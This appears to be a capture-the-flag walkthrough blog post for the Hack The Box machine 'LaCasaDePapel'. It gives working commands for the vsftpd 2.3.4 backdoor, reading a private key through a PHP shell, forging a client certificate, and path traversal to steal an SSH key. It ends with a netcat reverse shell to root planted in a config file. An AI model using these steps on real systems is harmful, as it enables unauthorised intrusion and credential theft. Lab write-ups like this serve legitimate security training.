---
layout: post
title: "LaCasaDePapel"
categories: HTB-Walkthrough
---

![lacasa1](/assets/img/lacasadepapel/lacasa1.png)

10.10.10.131




<h3>Nmap</h3>


```
nmap -sV -Pn 10.10.10.131 |tee -a lacasa.txt
```

```
Nmap scan report for lacasadepapel.htb (10.10.10.131)
Host is up (0.26s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
80/tcp  open  http     Node.js (Express middleware)
443/tcp open  ssl/http Node.js Express framework
Service Info: OS: Unix
```

Using `searchsploit` for 'vsftpd 2.3.4' we get a metasploit exploit for the well known backdoor vulnerability.


Searching about the vulnerability, I find a [Wiki page](https://en.wikipedia.org/wiki/Vsftpd).
Quote:
```
In July 2011, it was discovered that vsftpd version 2.3.4 downloadable from the master site had been compromised.[2][3] Users logging into a compromised vsftpd-2.3.4 server may issue a ":)" smileyface as the username and gain a command shell on port 6200.
```

We can see this at work in the metasploit module,

inspect the exploit with `searchsploit -x 17491`

see excerpt below:
![smileface](/assets/img/lacasadepapel/lacasa-msf-smiley.png)


This line shows the use of the smileyface:
```
sock.put("USER #{rand_text_alphanumeric(rand(6)+1)}:)\r\n")
```

The exploit generates random text for the username and enters a smileyface after it to trigger the vulnerability.

A [python exploit](https://raw.githubusercontent.com/Andhrimnirr/Python-Vsftpd-2.3.4-Exploit/master/exploit.py) for the vulnerability is easily found, and used to open port 6200.

```
python3 exploit.py 10.10.10.131 21

####

Author:İbrahim
https://github.com/Andhrimnirr/Python-Vsftpd-2.3.4-Exploit
[+] SUCCESSFUL CONNECTİON
[*] SESSION CREATED
[!] Interactive shell to check >> use command shell_check                                                          
[!] Failed to connect to backdoor                                                                                  
timed out                                                                                                          
```
The exploit was successful in opening the backdoor, but for some reason it failed to generate an interactive shell.

I tried to connect to the port manually with netcat: and sucessfully got a Psy shell.

```
nc -nv 10.10.10.131 6200

####

(UNKNOWN) [10.10.10.131] 6200 (?) open                                                                             
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman                                                              
ls                                                                                                                 
Variables: $tokyo                                                                                                  
```                                                                                                                   

It seems that we didn't need an exploit at all, just connecting via ftp and entering an username with a smileyface will open the door,
and connection with netcat gets us the shell.

I reset the box to test the theory.

```
ftp 10.10.10.131
Connected to 10.10.10.131.
220 (vsFTPd 2.3.4)
Name (10.10.10.131:root): sh1n0bi:)
331 Please specify the password.
Password:


```

The ftp connection hangs; I open another terminal tab and try to connect to port 6200

```
nc -nv 10.10.10.131 6200
(UNKNOWN) [10.10.10.131] 6200 (?) open
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
ls
Variables: $tokyo
```

Yup it works!

Conclusion: manual exploit is easy, no need for execution of script.

<hr width="300" size="10">


We can find instructions and commands to use in this `psy` shell [here](https://github.com/bobthecow/psysh/wiki/Commands)

The `show` command allows us to examine the `$tokyo` variable.

![show-tokyo](/assets/img/lacasadepapel/lacasa-show-tokyo.png)


the 'file_get_contents' command can be used to view the ca.key.

```
file_get_contents('/home/nairobi/ca.key')


=> """
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
   """

```



<hr width="300" size="10">



This is an ssl Certificate Authority key...Lets add lacasadepapel.htb to the /etc/hosts file and look at the website...



<hr width="300" size="10">


<h3>Web</h3>

Browsing to https://10.10.10.131 we get a cerificate error notification, we'll need to generate
our own signed certificate.



<hr width="300" size="10">


<h3>Openssl</h3>

We have the 'ca.key' from the target.

We can use nmap again, to get the server's certificate from the target.

```
nmap --script=ssl-cert 10.10.10.131 -p 443 -v
```

```
PORT    STATE SERVICE
443/tcp open  https
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Issuer: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-01-27T08:35:30
| Not valid after:  2029-01-24T08:35:30
| MD5:   6ea4 933a a347 ce50 8c40 5f9b 1ea8 8e9a
| SHA-1: 8c47 7f3e 53d8 e76b 4cdf ecca adb6 0551 b1b6 38d4
| -----BEGIN CERTIFICATE-----
| MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs
| YWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x
| OTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl
| cGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rV
| QJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8
| /rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B
| 4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUV
| ESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiR
| PBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqG
| SIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+C
| hXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6
| vmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywx
| BoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkI
| EqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwli
| MgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4
|_-----END CERTIFICATE-----
```




<hr width="300" size="10">


Now we can produce our own certificate to gain access:

```
openssl pkcs12 -export -in ssl.crt -inkey ca.key -out sh1n.p12
```

Import the generated certificate to firefox:

![import](/assets/img/lacasadepapel/lacasa-import-cert.png)


Refresh the firefox page and confirm use of the new cert.

![refresh](/assets/img/lacasadepapel/lacasa-refresh.png)


<hr width="300" size="10">


We can now access the site.


![private](/assets/img/lacasadepapel/lacasa-private-area.png)


Selecting 'Season 2', the url looks like the server could be potentially vulnerable:

```
https://10.10.10.131/?path=SEASON-2
```

Opening an episode file up in a new tab, we get a new url.

```
https://10.10.10.131/file/U0VBU09OLTIvMDMuYXZp
```

The filename is changed into base64...

```
echo U0VBU09OLTIvMDMuYXZp |base64 -d 
SEASON-2/03.avi
```



<hr width="300" size="10">


Testing the Season2 url for 'path traversal', we find that it is vulnerable.

```
https://10.10.10.131/?path=../
```

![path-trav](/assets/img/lacasadepapel/lacasa-path-trav1.png)


The contents of the directory look like a user home folder. We can see the user flag!

perhaps we can view the flag if we use base64 encoding.

```
echo -n "../user.txt" |base64
Li4vdXNlci50eHQ=
```

This works, and we can download the user flag.

![userflag](/assets/img/lacasadepapel/lacasa-download-user-flag.png)


we can move back another directory, into the '/home' folder, and get a list of users.

```
https://10.10.10.131/?path=../../
```

![homedir](/assets/img/lacasadepapel/lacasa-homedir.png)


By checking the folders, we can see that the flag is in the 'berlin' home directory.

We can enter his '.ssh' folder and view the contents.

![ssh](/assets/img/lacasadepapel/lacasa-ssh-folder.png)


<hr width="300" size="10">

We can try the same tactic of encoding the filename to recover the 'id_rsa' file.

```
echo -n "../.ssh/id_rsa" |base64
Li4vLnNzaC9pZF9yc2E=
```

![idrsa](/assets/img/lacasadepapel/lacasa-download-idrsa.png)


<hr width="300" size="10">


Trying to login via ssh as berlin fails with this id_rsa, trying it with the other usernames we find it does work
with 'professor'.


```
ssh -i id_rsa professor@10.10.10.131
 
 _             ____                  ____         ____                  _ 
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|       

lacasadepapel [~]$ id
uid=1002(professor) gid=1002(professor) groups=1002(professor)
lacasadepapel [~]$ ls -la
total 24
drwxr-sr-x    4 professo professo      4096 Mar  6  2019 .
drwxr-xr-x    7 root     root          4096 Feb 16  2019 ..
lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -> /dev/null
drwx------    2 professo professo      4096 Jan 31  2019 .ssh
-rw-r--r--    1 root     root            88 Jan 29  2019 memcached.ini
-rw-r-----    1 root     nobody         434 Jan 29  2019 memcached.js
drwxr-sr-x    9 root     professo      4096 Jan 29  2019 node_modules
lacasadepapel [~]$ 

lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
lacasadepapel [~]$ 

```

<hr width="300" size="10">



<h3>Privilege Escalation</h3>


Looking at the .ini file, we can see that it is run as root with the 'sudo' command.

With `pspy` we can see if this command is being periodically run.

I make a working directory, and copy pspy to it.
```
mkdir /var/tmp/boo
```

serve up pspy with a python server
```
python3 -m http.server 80
```
use wget to collect the file.
```
wget http://10.10.14.42/pspy
```
make the file executable and run it.
```
chmod +x pspy;./pspy
```


I find that the command is run as root, every minute:
```
CMD: UID=0    PID=9702   | sudo -u nobody /usr/bin/node /home/professor/memcached.js
```

Change directory back to professor's home, and write a new memcached.ini by using `cat`.

```
lacasadepapel [~]$ mv memcached.ini memcached-old.ini
lacasadepapel [~]$ cat > memcached.ini << EOF
> [program:memcached]
> command = nc 10.10.14.42 6969 -e /bin/bash
> EOF
lacasadepapel [~]$ 
```

set a listener on 6969 and wait...

Its not long, and we have got our root shell.

```
nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.131] 35813
id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
cat /home/berlin/user.txt
4dxxxxxxxxxxxxxxxxxxxxxxxxxxx62d
cat /root/root.txt
58xxxxxxxxxxxxxxxxxxxxxxxxxxx511

```

:)










